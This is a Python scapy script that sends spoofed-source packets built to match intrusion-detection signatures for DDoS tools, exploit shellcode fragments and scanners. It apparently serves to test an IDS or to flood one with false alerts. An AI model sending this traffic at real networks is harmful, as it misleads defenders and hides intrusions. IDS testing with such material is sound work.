import optparse
from scapy.all import *
from random import randint


def ddosTest(src, dst, iface, count):
    pkt=IP(src=src,dst=dst)/ICMP(type=8,id=678)/Raw(load='1234')
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src,dst=dst)/ICMP(type=0)/Raw(load='AAAAAAAAAA')
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src,dst=dst)/UDP(dport=31335)/Raw(load='PONG')
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src,dst=dst)/ICMP(type=0,id=456)
    send(pkt, iface=iface, count=count)


def exploitTest(src, dst, iface, count):
    
    pkt = IP(src=src, dst=dst) / UDP(dport=518) \
    /Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src, dst=dst) / UDP(dport=635) \
    /Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)


def scanTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=7) \
      /Raw(load='cybercop')
    send(pkt)

    pkt = IP(src=src, dst=dst) / UDP(dport=10080) \
      /Raw(load='Amanda')
    send(pkt, iface=iface, count=count)


def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-i <iface> -s <src> -t <target> -c <count>'
                              )
    parser.add_option('-i', dest='iface', type='string',\
      help='specify network interface')
    parser.add_option('-s', dest='src', type='string',\
      help='specify source address')
    parser.add_option('-t', dest='tgt', type='string',\
      help='specify target address')
    parser.add_option('-c', dest='count', type='int',\
      help='specify packet count')

    (options, args) = parser.parse_args()
    if options.iface == None:
        iface = 'eth0'
    else:
        iface = options.iface
    if options.src == None:
        src = '.'.join([str(randint(1,254)) for x in range(4)])
    else:
        src = options.src
    if options.tgt == None:
        print parser.usage
        exit(0)
    else:
        dst = options.tgt
    if options.count == None:
        count = 1
    else:
        count = options.count

    ddosTest(src, dst, iface, count)
    exploitTest(src, dst, iface, count)
    scanTest(src, dst, iface, count)


if __name__ == '__main__':
    main()

